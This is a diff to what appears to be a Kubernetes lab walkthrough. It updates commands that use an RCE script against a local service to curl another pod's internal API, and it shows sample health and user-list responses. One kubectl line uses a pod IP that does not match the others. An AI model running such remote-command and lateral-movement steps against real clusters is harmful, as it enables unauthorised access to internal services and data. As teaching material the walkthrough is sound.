@@ -153,15 +153,20 @@ python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.defaul
       #        {
       #          "containerPort": 80,
       #          "protocol": "TCP"
-      #  "podIP": "10.244.1.19",
+      #  "podIP": "10.244.1.24",
 
-python scripts/rce.py http://localhost:8080 "curl http://10.244.1.19"
+python scripts/rce.py http://localhost:8080 "curl -fsSL http://10.244.1.24/api/v1/healthz"
+# executable response:
+# {"status":"healthy","message":"Service is running"}
 
+python scripts/rce.py http://localhost:8080 "curl -fsSL http://10.244.1.24/api/v1/users"
+# [{"id":1,"name":"Alice"},{"id":2,"name":"Bob"}]
 ```
 
 ```sh
-kubectl run curl-test --rm -it --image=alpine/curl -- -fsSL http://10.244.1.19
+kubectl run curl-test --rm -it --image=alpine/curl -- -fsSL http://10.244.1.14/api/v1/healthz
 kubectl run curl-test --rm -it --image=alpine/curl -- sh
+curl http://10.244.1.24/api/v1/healthz
 ```
 
 ---
